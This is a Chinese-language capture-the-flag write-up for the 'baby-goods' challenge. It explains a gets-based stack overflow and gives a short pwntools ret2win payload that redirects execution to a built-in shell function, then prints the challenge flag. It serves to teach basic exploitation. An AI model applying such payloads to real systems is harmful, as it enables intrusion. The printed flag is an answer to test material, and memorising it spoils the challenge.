# baby-goods

## 题目简述

程序在 `buildpram()` 中用 `gets` 读取婴儿车名称到 16 字节栈缓冲区。二进制无 PIE，并内置函数 `sub_15210123()` 调用 `execve("/bin/sh", 0, 0)`，因此只需完成一次 ret2win。

## 解题过程

先输入任意用户名，菜单选择构建 pram，并提交合法尺寸 1 至 5。随后触发：

```c
char buf[0x10];
/* ... */
gets(buf);
```

反汇编可见 `buf` 位于 `rbp - 0x20`，保存的返回地址位于 `rbp + 8`，故覆盖偏移为 $0x20+8=0x28$。后门函数地址固定为 `0x401236`：

```python
payload = flat({
    0x28: p64(0x401236),
})

io.sendlineafter(b"Enter your name: ", b"pwn")
io.sendlineafter(b"Input: ", b"1")
io.sendlineafter(b"size of the pram", b"1")
io.sendlineafter(b"Give it a name: ", payload)
```

`buildpram()` 返回时跳入后门并执行 `/bin/sh`，取得：

```text
grey{4s_34sy_4s_t4k1ng_c4ndy_fr4m_4_b4by}
```

## 方法总结

本题用于练习最基本的栈溢出与 ret2win：确认危险读入、计算局部缓冲区到返回地址的真实偏移、在无 PIE 条件下取固定函数地址。偏移应从反汇编或 cyclic pattern 验证，不能只按源码中的数组大小猜测，因为编译器会插入对齐与其他局部变量。
